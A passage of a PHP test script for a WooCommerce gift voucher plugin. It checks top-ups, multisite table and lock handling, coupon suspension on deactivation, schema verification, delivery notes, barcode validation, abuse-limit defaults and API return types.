check( 'minimum remaining validity 0 (filter): any valid card can be topped up', '' === VCAP\TopUp::remaining_validity_error( $soon ) );
unset( $GLOBALS['vcap_test_filters']['vcap_topup_min_remaining_days'] );
// E5: the customer confirmation names the masked card, amount, new balance and validity.
$conf_card             = new Voucher();
$conf_card->code       = 'GIFT-ABCD-1234';
$conf_card->balance    = 80.0;
$conf_card->currency   = 'EUR';
$conf_card->expires_at = '2029-12-31 22:59:59';
$conf = VCAP\TopUp::confirmation( $conf_card, 50.0 );
check( 'top-up confirmation: masked code, amount, new balance, valid until', str_contains( $conf, '…1234' ) && ! str_contains( $conf, 'ABCD' ) && str_contains( $conf, '50,00' ) && str_contains( $conf, '80,00' ) && str_contains( $conf, wp_date( (string) get_option( 'date_format', 'Y-m-d' ), strtotime( '2029-12-31 22:59:59 UTC' ) ) ), $conf );
// E2: booking back is capped by what the order charged to the voucher and was not booked back yet.
check( 'book back onto voucher: at most the charged amount minus earlier returns', 20.0 === VCAP\OrderReturn::cap( 50.0, 30.0 ) && 0.0 === VCAP\OrderReturn::cap( 50.0, 60.0 ) && 0.01 === VCAP\OrderReturn::cap( 0.3, 0.29 ) );
// P7, T6, E5: cases for the shop are kept per order and kind until resolved.
VCAP\Attention::add( 7, 'void:3', 'Voucher X could not be voided' );
VCAP\Attention::add( 7, 'void:3', 'Voucher X could not be voided (again)' );
VCAP\Attention::add( 8, 'topup:9', 'Top-up not booked' );
$attention = VCAP\Attention::all();
check( 'attention: one case per order and kind, updated in place', 2 === count( $attention ) && 'Voucher X could not be voided (again)' === ( $attention['7|void3']['text'] ?? '' ) && VCAP\Attention::has( 8, 'topup:9' ), wp_json_encode( $attention ) );
VCAP\Attention::resolve( 7, 'void:3' );
check( 'attention: a resolved case is gone, others stay', ! VCAP\Attention::has( 7, 'void:3' ) && VCAP\Attention::has( 8, 'topup:9' ) );
check( 'attention: Site Health reports open cases as critical', 'critical' === ( new VCAP\Attention() )->test()['status'] );
VCAP\Attention::resolve( 8, 'topup:9' );
check( 'attention: no case left – Site Health good', 'good' === ( new VCAP\Attention() )->test()['status'] && array() === VCAP\Attention::all() );
for ( $i = 1; $i <= 105; $i++ ) {
	VCAP\Attention::add( $i, 'void:' . $i, 'case ' . $i );
}
check( 'attention: at most 100 cases, the oldest dropped first', 100 === count( VCAP\Attention::all() ) && ! VCAP\Attention::has( 1, 'void:1' ) && VCAP\Attention::has( 105, 'void:105' ) );
delete_option( VCAP\Attention::OPTION );
// S12: every store-credit refund form gets its own one-time key.
check( 'refund as store credit: one-time form keys differ', VCAP\StoreCredit::request_key() !== VCAP\StoreCredit::request_key() && 32 === strlen( VCAP\StoreCredit::request_key() ) );
echo "Lifecycle and multisite (deactivation, upgrade, site tables)\n";
/** Records the queries of the code under test; $answers maps a query pattern (regex) to its result. */
final class VCAP_Test_Wpdb {
	public string $prefix   = 'wp_';
	public string $posts    = 'wp_posts';
	public string $postmeta = 'wp_postmeta';
	public string $options  = 'wp_options';
	public int $rows_affected = 0;
	public array $log     = array();
	public array $answers = array();
	public function prepare( $query, ...$args ) {
		$args = isset( $args[0] ) && is_array( $args[0] ) ? $args[0] : $args;
		return vsprintf( str_replace( array( '%d', '%s', '%i' ), array( '%d', "'%s'", '%s' ), $query ), $args );
	}
	public function esc_like( $s ) { return addcslashes( (string) $s, '_%\\' ); }
	public function suppress_errors( $s = true ) { return false; }
	public function get_blog_prefix( $id = null ) { return 'wp_' . ( (int) $id > 1 ? (int) $id . '_' : '' ); }
	public function get_charset_collate() { return ''; }
	private function answer( $query, $default ) {
		$this->log[] = $query;
		foreach ( $this->answers as $pattern => $result ) {
			if ( preg_match( $pattern, $query ) ) {
				return is_callable( $result ) ? $result( $query ) : $result;
			}
		}
		return $default;
	}
	public function query( $q ) { return $this->answer( $q, 1 ); }
	public function get_var( $q ) { return $this->answer( $q, null ); }
	public function get_row( $q, $o = null ) { return $this->answer( $q, null ); }
	public function get_col( $q, $i = 0 ) { return $this->answer( $q, array() ); }
	public function get_results( $q, $o = null ) { return $this->answer( $q, array() ); }
}
defined( 'ARRAY_A' ) || define( 'ARRAY_A', 'ARRAY_A' );
if ( ! function_exists( 'clean_post_cache' ) ) {
	function clean_post_cache( $id ) { $GLOBALS['vcap_test_cleaned'][] = (int) $id; }
	function wp_cache_delete( $k, $g = '' ) { return true; }
	function maybe_unserialize( $v ) { return is_string( $v ) && false !== ( $u = @unserialize( $v ) ) ? $u : $v; } // phpcs:ignore
}
$saved_wpdb      = $GLOBALS['wpdb'] ?? null;
$GLOBALS['wpdb'] = new VCAP_Test_Wpdb();

// M6: table names follow switch_to_blog() (the repository keeps no prefix of its own).
$repo                    = new VCAP\VoucherRepository();
$GLOBALS['wpdb']->prefix = 'wp_7_';
$repo->get( 5 );
$GLOBALS['wpdb']->prefix = 'wp_';
check( 'a repository built on one site reads the tables of the site switched to', str_contains( (string) end( $GLOBALS['wpdb']->log ), 'FROM wp_7_vcap_vouchers ' ) );

// A11: deleting a site drops its voucher tables.
$dropped = VCAP\Install::drop_site_tables( array( 'wp_3_posts' ), 3 );
check( 'a deleted site takes its nine voucher tables with it', 10 === count( $dropped ) && in_array( 'wp_3_vcap_vouchers', $dropped, true ) && in_array( 'wp_3_vcap_claims', $dropped, true ) && in_array( 'wp_3_vcap_scan_keys', $dropped, true ) && ! in_array( 'wp_vcap_vouchers', $dropped, true ) );

// A6: named MySQL locks are server-wide: the site's table prefix keeps them apart.
$lock_a                  = VCAP\Install::lock_name( 'delivery_42' );
$GLOBALS['wpdb']->prefix = 'wp_2_';
$lock_b                  = VCAP\Install::lock_name( 'delivery_42' );
$GLOBALS['wpdb']->prefix = 'wp_';
check( 'the same voucher id on two sites uses two different locks (at most 64 characters)', $lock_a !== $lock_b && strlen( $lock_a ) <= 64 && str_ends_with( $lock_a, '_delivery_42' ) );
check( 'deliveries and promotion holds use the per-site lock name', str_contains( (string) file_get_contents( VCAP_PATH . 'src/Delivery.php' ), "Install::lock_name( 'delivery_'" ) && 2 === substr_count( (string) file_get_contents( VCAP_PATH . 'src/Discounts/Usage.php' ), "Install::lock_name( 'usage_'" ) );
// AP-Q2-5: the remaining named locks (refund as credit, book back, onboarding pages, background jobs) are per site too.
$q25_src = static fn( string $f ): string => (string) file_get_contents( VCAP_PATH . 'src/' . $f );
check( 'AP-Q2-5: refund-as-credit, book-back, onboarding and job locks use Install::lock_name() (no bare GET_LOCK names)', str_contains( $q25_src( 'StoreCredit.php' ), "Install::lock_name( 'refund_credit_'" ) && str_contains( $q25_src( 'OrderReturn.php' ), 'self::lock_name( $order->get_id() )' ) && str_contains( $q25_src( 'Admin/Onboarding.php' ), "Install::lock_name( 'onboarding_'" ) && str_contains( $q25_src( 'Jobs.php' ), "Install::lock_name( 'job_'" ) && ! preg_match( '/\$lock\s*=\s*(\'vcap_|substr\()/',$q25_src( 'StoreCredit.php' ) . $q25_src( 'OrderReturn.php' ) . $q25_src( 'Admin/Onboarding.php' ) . $q25_src( 'Jobs.php' ) ) );
check( 'AP-Q2-5: OrderReturn::lock_name() is the per-site name other order paths can share', VCAP\Install::lock_name( 'return_42' ) === VCAP\OrderReturn::lock_name( 42 ) );

// L10/L4: the marker of a suspended coupon is written first; without it the coupon is not drafted.
$GLOBALS['vcap_test_cleaned'] = array();
$GLOBALS['wpdb']->log         = array();
$suspended                    = VCAP\Install::suspend_balance_coupons( array( 11, 12, 12 ) );
$sql                          = implode( "\n", $GLOBALS['wpdb']->log );
check( 'deactivation marks each coupon before it sets it to draft', 2 === $suspended && preg_match( "/INSERT INTO wp_postmeta .*\\(11, '_vcap_suspended', '1'\\),\\(12, /", $sql ) && strpos( $sql, 'INSERT INTO wp_postmeta' ) < strpos( $sql, "SET post_status = 'draft'" ) && array( 11, 12 ) === $GLOBALS['vcap_test_cleaned'] );
$GLOBALS['wpdb']->answers = array( '/^INSERT INTO wp_postmeta/' => false );
$GLOBALS['wpdb']->log     = array();
$suspended                = VCAP\Install::suspend_balance_coupons( array( 13 ) );
check( 'a coupon whose marker could not be written stays published (reactivation would not find it)', 0 === $suspended && ! preg_grep( "/SET post_status = 'draft'/", $GLOBALS['wpdb']->log ) );

// L4: besides gift cards: vouchers not redeemable in the shop and coupons with rules only Voucher Captain checks.
$GLOBALS['wpdb']->answers = array(
	'/^SHOW TABLES LIKE/'               => 'wp_vcap_vouchers',
	"/v\\.usage_mode = 'balance'/"      => array( '21' ),
	'/woocommerce_order_itemmeta/'      => array(
		array( 'ID' => '22', 'meta_value' => serialize( array( 'channels' => array( 'counter' ) ) ) ),
		array( 'ID' => '23', 'meta_value' => serialize( array( 'channels' => array( 'shop', 'counter' ) ) ) ),
	),
	'/_vcap_first_order/'               => array( '24', '21' ),
);
$GLOBALS['wpdb']->log = array();
$selected             = VCAP\Install::suspendable_coupon_ids();
$meta_sql             = (string) current( preg_grep( '/_vcap_first_order/', $GLOBALS['wpdb']->log ) );
check( 'deactivation also suspends counter-only vouchers and first-order, referral and SKU coupons', array( 21, 22, 24 ) === $selected && str_contains( $meta_sql, '_vcap_referral_owner' ) && str_contains( $meta_sql, '_vcap_skus' ) && str_contains( $meta_sql, '_vcap_exclude_skus' ), json_encode( $selected ) );

// L2: the id list of earlier releases publishes only coupons that still belong to a gift card or store credit.
$GLOBALS['vcap_test_options'][ VCAP\Install::SUSPENDED_OPTION ] = array( 31, 32 );
$GLOBALS['wpdb']->answers = array(
	'/^SHOW TABLES LIKE/'                   => 'wp_vcap_vouchers',
	'/SELECT DISTINCT coupon_id FROM wp_vcap_vouchers/' => array( '31' ),
	'/^SELECT post_id FROM wp_postmeta/'    => static fn( $q ) => str_contains( $q, 'post_id > 0 ' ) ? array( '41', '42' ) : array(),
);
$GLOBALS['wpdb']->log = array();
VCAP\Install::restore_balance_coupons();
$published = array_values( preg_grep( "/SET post_status = 'publish'/", $GLOBALS['wpdb']->log ) );
check( 'reactivation publishes marked coupons and listed ids with a gift card row only', 2 === count( $published ) && str_contains( $published[0], 'IN (31)' ) && str_contains( $published[1], 'IN (41,42)' ) && ! isset( $GLOBALS['vcap_test_options'][ VCAP\Install::SUSPENDED_OPTION ] ) && preg_grep( "/^DELETE FROM wp_postmeta WHERE post_id IN \\(41,42\\) AND meta_key = '_vcap_suspended'/", $GLOBALS['wpdb']->log ), json_encode( $published ) );

// L12: every index of the schema is verified, not only the unique keys.
$GLOBALS['wpdb']->answers = array(
	'/^SHOW TABLES LIKE/'           => static fn( $q ) => preg_match( "/LIKE '([a-z_0-9\\\\]+)'/", $q, $m ) ? stripslashes( $m[1] ) : null,
	'/^SHOW COLUMNS FROM/'          => static function ( $q ) {
		preg_match( '/FROM (\S+)/', $q, $m );
		return array( 'id', 'code', 'coupon_id', 'type', 'status', 'order_id', 'order_item_id', 'item_index', 'product_id', 'variation_id', 'template_id', 'usage_mode', 'discount_type', 'initial_amount', 'balance', 'currency', 'expires_at', 'buyer_name', 'buyer_email', 'user_id', 'recipient_name', 'recipient_email', 'message', 'fields', 'send_to', 'delivery_at', 'delivered_at', 'token', 'transferable', 'terms', 'max_checkins', 'checkins', 'last_checkin_at', 'delivered_roles', 'voucher_number', 'created_at', 'updated_at', 'voucher_id', 'event', 'amount', 'balance_after', 'source', 'till', 'receipt', 'note', 'actor_email_hash', 'batch', 'imported_at', 'used_at', 'redemption_key', 'target', 'state', 'request_hash', 'meta', 'campaign_id', 'customer_key', 'claim_key', 'kind', 'uses', 'window_end', 'counter_key', 'hits', 'key_hash', 'signature', 'event_mark', 'claimed_at', 'response' );
	},
	'/^SHOW INDEX FROM wp_vcap_events$/' => array( 'PRIMARY', 'voucher_ledger', 'voucher_order', 'actor_email_hash', 'event' ),
	'/^SHOW INDEX FROM/'            => static function ( $q ) {
		return array( 'PRIMARY', 'code', 'token', 'order_item_slot', 'order_id', 'coupon_id', 'status_expires', 'status_updated', 'expires_at', 'delivery_due', 'product_id', 'recipient_email', 'buyer_email', 'user_type', 'voucher_number', 'batch_free', 'batch_used', 'redemption_key', 'voucher_id', 'user_id', 'state_expires', 'campaign_customer', 'order_campaign', 'kind_created', 'claimed_at' );
	},
	'/information_schema/'          => 'InnoDB',
);
$problems = VCAP\Install::verify_schema();
check( 'a missing ordinary index is reported by the schema check', array( 'index wp_vcap_events.created_at is missing' ) === $problems, json_encode( $problems ) );
$GLOBALS['wpdb']->answers = array();

// L5: after a reactivation only Voucher Captain's own handlers of an order hook run again.
final class VCAP_Test_Foreign_Handler {
	public static array $calls = array();
	public static function handle( ...$args ) { self::$calls[] = $args; }
}
$hook = (object) array(
	'callbacks' => array(
		30 => array( 'own' => array( 'function' => array( VCAP\Install::class, 'lock_name' ), 'accepted_args' => 1 ) ),
		10 => array(
			'foreign' => array( 'function' => array( 'VCAP_Test_Foreign_Handler', 'handle' ), 'accepted_args' => 3 ),
			'closure' => array( 'function' => static function () {}, 'accepted_args' => 1 ),
			'string'  => array( 'function' => 'VCAP\\Install::missing_extensions', 'accepted_args' => 1 ),
		),
	),
);
$own = VCAP\CatchUp::own_callbacks( $hook );
check( 'the catch-up replays only callbacks from the plugin\'s src/, by priority (no foreign emails or webhooks)', 2 === count( $own ) && 'VCAP\\Install::missing_extensions' === $own[0]['function'] && 'lock_name' === $own[1]['function'][1] );
$GLOBALS['wp_filter'] = array( 'vcap_test_hook' => (object) array( 'callbacks' => array( 10 => array( 'foreign' => array( 'function' => array( 'VCAP_Test_Foreign_Handler', 'handle' ), 'accepted_args' => 1 ) ) ) ) );
VCAP\CatchUp::replay( 'vcap_test_hook', array( 1, 2 ) );
check( 'foreign handlers are never called by the catch-up', array() === VCAP_Test_Foreign_Handler::$calls );
unset( $GLOBALS['wp_filter'] );

// L8: without WooCommerce the plugin does not boot (no vcap() for connectors, no fatal error later).
$refused = false;
try {
	VCAP\Plugin::instance();
} catch ( LogicException $e ) {
	$refused = true;
}
check( 'without WooCommerce Plugin::instance() refuses to boot and ready() stays false', $refused && ! VCAP\Plugin::requirements_met() && ! VCAP\Plugin::ready() );
$main = (string) file_get_contents( VCAP_PATH . 'voucher-captain.php' );
check( 'vcap() is defined only after the WooCommerce check, followed by the action vcap_loaded', strpos( $main, 'requirements_met()' ) < strpos( $main, 'function vcap()' ) && strpos( $main, 'function vcap()' ) < strpos( $main, "do_action( 'vcap_loaded'" ) );

// L9 / A3.
check( 'missing PHP extensions are named (activation and Site Health)', array( 'vcap_no_such_extension' ) === VCAP\Install::missing_extensions( array( 'pcre', 'vcap_no_such_extension' ) ) && array( 'mbstring', 'dom' ) === VCAP\Install::REQUIRED_EXTENSIONS );
check( 'a network activation sets up at most 25 sites in its own request', 25 === VCAP\Install::NETWORK_ACTIVATION_SITES );
// A13: keys without a Pass Captain order (orphans) are looked up together, 500 per query, and a missing key is
// remembered for a while – not one LIKE/longtext query per key on every report call.
if ( ! interface_exists( 'PassCaptain\\Integrations\\Vouchers\\ProviderInterface' ) ) {
	eval( 'namespace PassCaptain\\Integrations\\Vouchers; interface ProviderInterface {}' ); // phpcs:ignore Squiz.PHP.Eval
}
$a13_keys = array( 'found-key' );
for ( $i = 0; $i < 599; $i++ ) {
	$a13_keys[] = 'orphan-' . $i;
}
$GLOBALS['wpdb']->answers = array( '/provider_reference IN/' => array( 'voucher:found-key' ) );
$GLOBALS['wpdb']->log     = array();
unset( $GLOBALS['vcap_test_transients']['vcap_pc_orphans'] );
$a13_reconcile = ( new ReflectionClass( VCAP\Compat\PassCaptainReconcile::class ) )->newInstanceWithoutConstructor();
try {
	$a13_method = new ReflectionMethod( VCAP\Compat\PassCaptainReconcile::class, 'orders_existing' );
	$a13_method->setAccessible( true );
	$a13_first   = $a13_method->invoke( $a13_reconcile, $a13_keys );
	$a13_queries = count( preg_grep( '/wpcap_orders/', $GLOBALS['wpdb']->log ) );
	$GLOBALS['wpdb']->log = array();
	$a13_second  = $a13_method->invoke( $a13_reconcile, $a13_keys );
	$a13_again   = array_values( preg_grep( '/wpcap_orders/', $GLOBALS['wpdb']->log ) );
} catch ( \ReflectionException $e ) {
	$a13_first = $a13_second = null;
	$a13_queries = -1;
	$a13_again   = array( 'missing method' );
}
check( 'A13: 600 keys are checked in two queries (500 per IN list), only the key with an order is found', array( 'found-key' => true ) === $a13_first && 2 === $a13_queries, (string) $a13_queries );
check( 'A13: on the next report call only the found key is asked again, orphans come from the cache', array( 'found-key' => true ) === $a13_second && 1 === count( $a13_again ) && ! str_contains( $a13_again[0], 'orphan-' ), json_encode( $a13_again ) );
$GLOBALS['wpdb']->answers = array();

$GLOBALS['wpdb'] = $saved_wpdb;

// C8 / C13: PDF output and the ticket status page are kept out of page caches with DONOTCACHEPAGE (not only
// no-cache headers), and the PDF stream empties output buffers and switches compression off.
$vcap_source = static function ( string $class, string $method ): string {
	$ref   = new ReflectionMethod( $class, $method );
	$lines = file( (string) $ref->getFileName() );
	return implode( '', array_slice( (array) $lines, $ref->getStartLine() - 1, $ref->getEndLine() - $ref->getStartLine() + 1 ) );
};
$stream = $vcap_source( 'VCAP\\Preview', 'stream' );
$ticket = $vcap_source( 'VCAP\\Tickets', 'ticket_page' );
check( 'PDF stream and ticket status page use Shortcodes::no_cache() (DONOTCACHEPAGE), not only nocache_headers()', str_contains( $stream, 'Shortcodes::no_cache()' ) && str_contains( $ticket, 'Shortcodes::no_cache()' ) && ! str_contains( $ticket, 'nocache_headers()' ) );
check( 'the PDF stream cleans output buffers and switches zlib compression off before Content-Length', str_contains( $stream, 'wc_clean_buffers()' ) && str_contains( $stream, 'zlib.output_compression' ) && strpos( $stream, 'wc_clean_buffers()' ) < strpos( $stream, 'Content-Length' ) );

echo "Support, logging and audit trail (P7)\n";
// M13: notes are stored as code + arguments and translated when shown; plain notes of earlier versions stay.
$m13_note = VCAP\Note::make( 'delivery_partial', array( 'buyer', wp_json_encode( array( 'buyer' => 'mail_failed' ) ) ) );
check( 'M13: a coded note is stored without the sentence and rendered with role labels, never the internal role key', VCAP\Note::is_coded( $m13_note ) && ! str_contains( $m13_note, 'Not delivered' ) && 'Not delivered to: Buyer (will be retried). Buyer: the mail system did not accept the email' === VCAP\Note::render( $m13_note ), VCAP\Note::render( $m13_note ) );
check( 'M13: plain-text notes of earlier versions and staff notes are shown unchanged', 'Not delivered to: recipient (will be retried).' === VCAP\Note::render( 'Not delivered to: recipient (will be retried).' ) && '@vcap:broken' === VCAP\Note::render( '@vcap:broken' ) );
check( 'M13: "Sent to 2 addresses" names the roles', 'Sent to 2 addresses (Recipient, Buyer)' === VCAP\Note::render( VCAP\Note::make( 'delivered', array( 2, 'recipient,buyer' ) ) ) );
// D4: the reason per role is kept – disabled, no address and mail system error read differently.
$d4_text = VCAP\Note::render( VCAP\Note::make( 'delivery_not_sent', array( wp_json_encode( array( 'recipient' => 'disabled', 'buyer' => 'mail_failed' ) ) ) ) );
check( 'D4: a failed delivery names the reason per role (email disabled vs. mail system)', 'No email was sent (Recipient: email disabled; Buyer: the mail system did not accept the email).' === $d4_text, $d4_text );
$d4_mail = (string) file_get_contents( dirname( __DIR__ ) . '/src/Emails/VoucherEmail.php' );
check( 'D4: VoucherEmail::trigger() records disabled / no_recipient / mail_failed', str_contains( $d4_mail, "'disabled'" ) && str_contains( $d4_mail, "'no_recipient'" ) && str_contains( $d4_mail, "'mail_failed'" ) );
check( 'D4: the mail failure log keeps the voucher id', str_contains( $vcap_source( 'VCAP\\Health', 'record_mail_failure' ), "'voucher_id'" ) );
// D8: edit diff with masked addresses, the message only marked as changed.
$d8_before                  = new Voucher();
$d8_before->recipient_email = 'anna@gmial.com';
$d8_before->message         = 'Happy birthday';
$d8_before->send_to         = 'recipient';
$d8_before->status          = Voucher::STATUS_ACTIVE;
$d8_after                   = clone $d8_before;
$d8_after->recipient_email  = 'anna@gmail.com';
$d8_after->message          = 'Happy birthday, Anna';
$d8_diff                    = VCAP\Admin\VoucherAdmin::edit_diff( $d8_before, $d8_after );
$d8_text                    = VCAP\Note::render( VCAP\Note::make( 'edited', array( wp_json_encode( $d8_diff ) ) ) );
check( 'D8: "edited" records before → after with masked addresses and no message text', array( 'recipient_email', 'message' ) === array_keys( $d8_diff ) && str_contains( $d8_text, 'Recipient email: a***@gmial.com → a***@gmail.com' ) && ! str_contains( $d8_text, 'birthday' ), $d8_text );
check( 'D8: the ledger has a source column and log() stores Source::current()', str_contains( $vcap_source( 'VCAP\\VoucherRepository', 'log' ), "Source::current()" ) && str_contains( (string) file_get_contents( dirname( __DIR__ ) . '/src/Install.php' ), "source varchar(20) NOT NULL DEFAULT ''" ) && '1.6.0' === VCAP\Install::EVENT_SOURCE_VERSION );
check( 'D8: WP-CLI is recorded as source "cli"', ( defined( 'WP_CLI' ) && WP_CLI ? 'cli' : VCAP\Source::with( 'cli', static fn() => VCAP\Source::current() ) ) === 'cli' && isset( VCAP\Source::labels()['scanner'] ) );
// H7: manual sends check the status.
$h7 = new Voucher();
$h7->status = Voucher::STATUS_SCHEDULED;
$h7_scheduled = VCAP\Admin\VoucherAdmin::resend_refusal( $h7 );
$h7->status = Voucher::STATUS_VOID;
$h7_void = VCAP\Admin\VoucherAdmin::resend_refusal( $h7 );
$h7->status = Voucher::STATUS_ACTIVE;
check( 'H7: a scheduled or void voucher is not emailed by hand, an active one is', '' !== $h7_scheduled && str_contains( $h7_scheduled, 'Send now' ) && '' !== $h7_void && '' === VCAP\Admin\VoucherAdmin::resend_refusal( $h7 ) );
// D5: barcode type vs. code.
check( 'D5: EAN-13 refuses letters, Code 39 lower case; Code 128 takes anything', '' !== PdfRenderer::barcode_problem( 'EAN13', 'GIFT-K7QM2X9ZPA' ) && '' === PdfRenderer::barcode_problem( 'EAN13', '4006381333931' ) && '' !== PdfRenderer::barcode_problem( 'C39', 'abc' ) && '' === PdfRenderer::barcode_problem( 'C128', 'gift-äöü' ) );
check( 'D5: failed QR codes, barcodes and temp files are logged with the voucher id and element', str_contains( $vcap_source( 'VCAP\\PdfRenderer', 'to_temp_file' ), 'write_failed' ) && str_contains( $vcap_source( 'VCAP\\PdfRenderer', 'write_failed' ), "'voucher_id'" ) && str_contains( $vcap_source( 'VCAP\\PdfRenderer', 'element_failed' ), "'element'" ) && str_contains( $vcap_source( 'VCAP\\Delivery', 'record_attempt' ), "'delivered_without_pdf'" ) );
// D16: verbose log with an expiry.
$GLOBALS['vcap_test_options'][ VCAP\Logger::VERBOSE_OPTION ]       = 'yes';
$GLOBALS['vcap_test_options'][ VCAP\Logger::VERBOSE_UNTIL_OPTION ] = time() + 60;
$d16_on = VCAP\Logger::verbose();
$GLOBALS['vcap_test_options'][ VCAP\Logger::VERBOSE_UNTIL_OPTION ] = time() - 1;
$d16_expired = VCAP\Logger::verbose();
unset( $GLOBALS['vcap_test_options'][ VCAP\Logger::VERBOSE_OPTION ], $GLOBALS['vcap_test_options'][ VCAP\Logger::VERBOSE_UNTIL_OPTION ] );
check( 'D16: the verbose log is on while its window runs and switches itself off', $d16_on && ! $d16_expired && ( defined( 'VCAP_DEBUG' ) || ! VCAP\Logger::verbose() ) );
// Z12: values typed into the visible order item meta.
check( 'Z12: a corrected recipient email is taken over, an invalid one or a bad date is not', 'anna@gmail.com' === VCAP\Fields::visible_value( 'recipient_email', ' anna@gmail.com ' ) && null === VCAP\Fields::visible_value( 'recipient_email', 'anna(at)gmail' ) && null === VCAP\Fields::visible_value( 'delivery_date', '24.12.2026' ) && '2026-12-24' === VCAP\Fields::visible_value( 'delivery_date', '2026-12-24' ) );
// D13: the hook reference is generated and current.
exec( escapeshellarg( PHP_BINARY ) . ' ' . escapeshellarg( dirname( __DIR__ ) . '/bin/hooks.php' ) . ' --check 2>&1', $d13_out, $d13_rc );
check( 'D13: docs/HOOKS.md is generated from the code and up to date (php bin/hooks.php --check)', 0 === $d13_rc && str_contains( (string) file_get_contents( dirname( __DIR__ ) . '/docs/HOOKS.md' ), '`vcap_voucher_deleted`' ), implode( "\n", $d13_out ) );
// D9: WP-CLI commands exist and are registered only under WP-CLI.
$d9 = new ReflectionClass( 'VCAP\\CLI\\Command' );
check( 'D9: "wp vcap" has doctor, migrate, deliver, issue, sync, ratelimit, diagnostics', ! array_diff( array( 'doctor', 'migrate', 'deliver', 'issue', 'sync', 'ratelimit', 'diagnostics' ), array_map( static fn( $m ) => $m->getName(), $d9->getMethods( ReflectionMethod::IS_PUBLIC ) ) ) && str_contains( (string) file_get_contents( dirname( __DIR__ ) . '/src/Plugin.php' ), "defined( 'WP_CLI' ) && WP_CLI" ) );

echo "P12 abuse protection (safe defaults)\n";
$p12_defaults = VCAP\Settings::defaults();
check( 'V3/V5/V7: abuse limits are on by default (14 days wait, 10 rewards per 30 days, address check, 500 custom max, 1000 per 24 h, hold above 250 for 24 h)', 14 === $p12_defaults['vcap_referral_wait_days'] && 10 === $p12_defaults['vcap_referral_max_rewards'] && 'yes' === $p12_defaults['vcap_referral_address_check'] && 14 === $p12_defaults['vcap_bonus_wait_days'] && 500 === $p12_defaults['vcap_custom_max_default'] && 1000 === $p12_defaults['vcap_customer_daily_limit'] && 250 === $p12_defaults['vcap_hold_new_customer_above'] && 24 === $p12_defaults['vcap_hold_hours'] && '' === $p12_defaults['vcap_referral_min_spend'] );
$p12_custom = array( 'amount_source' => 'custom', 'custom_min' => '', 'custom_max' => '', 'custom_step' => '1' ) + ProductConfig::DEFAULTS;
$p12_max    = (float) ProductConfig::effective_custom_max( $p12_custom );
$p12_own    = (string) ProductConfig::effective_custom_max( array( 'custom_max' => '2000' ) + $p12_custom );
$p12_minhi  = (float) ProductConfig::effective_custom_max( array( 'custom_min' => '800' ) + $p12_custom );
$GLOBALS['vcap_test_options']['vcap_custom_max_default'] = 0;
$p12_off = ProductConfig::effective_custom_max( $p12_custom );
unset( $GLOBALS['vcap_test_options']['vcap_custom_max_default'] );
check( 'V7: a custom amount without own maximum is limited to 500 by default; an own maximum is kept; never below the minimum; 0 = no limit', 500.0 === $p12_max && '2000' === $p12_own && 800.0 === $p12_minhi && '' === $p12_off, var_export( array( $p12_max, $p12_own, $p12_minhi, $p12_off ), true ) );
check( 'V7: 600 is refused for a product without own maximum (default 500)', null !== VCAP\CustomAmount::error_for( array( 'custom_max' => $p12_max ) + $p12_custom, '600' ) && null === VCAP\CustomAmount::error_for( array( 'custom_max' => $p12_max ) + $p12_custom, '500' ) );
$p12_ref = ( new ReflectionClass( VCAP\Referrals::class ) )->newInstanceWithoutConstructor();
( new ReflectionProperty( VCAP\Referrals::class, 'settings' ) )->setValue( $p12_ref, new VCAP\Settings() );
$p12_auto = $p12_ref->effective_min_spend();
$GLOBALS['vcap_test_options']['vcap_referral_min_spend'] = '0';
$p12_zero = $p12_ref->effective_min_spend();
$GLOBALS['vcap_test_options']['vcap_referral_min_spend'] = '35';
$p12_own_min = $p12_ref->effective_min_spend();
$GLOBALS['vcap_test_options']['vcap_referral_friend_type'] = 'percent';
$GLOBALS['vcap_test_options']['vcap_referral_min_spend']   = '';
$p12_pct = $p12_ref->effective_min_spend();
unset( $GLOBALS['vcap_test_options']['vcap_referral_min_spend'], $GLOBALS['vcap_test_options']['vcap_referral_friend_type'] );
check( 'V3: the friend\'s code needs an order above the discount: automatic 2 × 10 = 20, an entered 0 becomes 11, 35 stays 35, percentages as entered', 20.0 === $p12_auto && 11.0 === $p12_zero && 35.0 === $p12_own_min && 0.0 === $p12_pct, var_export( array( $p12_auto, $p12_zero, $p12_own_min, $p12_pct ), true ) );

// D15: the API v1 facades declare their documented return types natively; the provider interface stays untyped (BC).
$d15_type  = static fn( string $class, string $method ): string => (string) ( new ReflectionMethod( $class, $method ) )->getReturnType();
$d15_types = array();
foreach ( array( 'check', 'reserve', 'commit', 'release', 'refund', 'get' ) as $d15_m ) {
	$d15_types[ 'redemptions::' . $d15_m ] = $d15_type( VCAP\API\V1\RedemptionService::class, $d15_m );
}
foreach ( array( 'lookup', 'reserve', 'commit', 'release' ) as $d15_m ) {
	$d15_types[ 'api_v1::' . $d15_m ]   = $d15_type( VCAP\API\V1\VoucherService::class, $d15_m );
	$d15_types[ 'provider::' . $d15_m ] = $d15_type( VCAP\API\V1\WooCommerceRedemptionProvider::class, $d15_m );
}
foreach ( array( 'check', 'reserve', 'get', 'commit', 'release' ) as $d15_m ) {
	$d15_types[ 'rest::' . $d15_m ] = $d15_type( VCAP\API\V1\RestController::class, $d15_m );
}
$d15_rest = array_filter( $d15_types, static fn( $t, $k ) => str_starts_with( $k, 'rest::' ), ARRAY_FILTER_USE_BOTH );
$d15_data = array_diff_key( $d15_types, $d15_rest );
check( 'D15: RedemptionService, VoucherService and the built-in provider return array|WP_Error natively', array() === array_filter( $d15_data, static fn( $t ) => ! in_array( $t, array( 'WP_Error|array', 'array|WP_Error' ), true ) ), var_export( $d15_data, true ) );
check( 'D15: the REST callbacks return WP_REST_Response|WP_Error and the permission callbacks bool|WP_Error natively', array() === array_filter( $d15_rest, static fn( $t ) => 'WP_REST_Response|WP_Error' !== $t ) && 'WP_Error|bool' === $d15_type( VCAP\API\V1\RestController::class, 'can_redeem' ) && 'WP_Error|bool' === $d15_type( VCAP\API\V1\RestController::class, 'can_access' ), var_export( $d15_rest, true ) . $d15_type( VCAP\API\V1\RestController::class, 'can_access' ) );
$d15_iface = array();
foreach ( array( 'lookup', 'reserve', 'commit', 'release' ) as $d15_m ) {
	$d15_iface[ $d15_m ] = ( new ReflectionMethod( VCAP\Contracts\RedemptionProvider::class, $d15_m ) )->hasReturnType();
}
check( 'D15: the RedemptionProvider interface keeps lookup/reserve/commit/release without native return types (existing providers stay compatible within v1)', array( false ) === array_values( array_unique( $d15_iface ) ) && 'bool' === $d15_type( VCAP\Contracts\RedemptionProvider::class, 'supports' ), var_export( $d15_iface, true ) );
$d15_legacy = new class() implements VCAP\Contracts\RedemptionProvider {
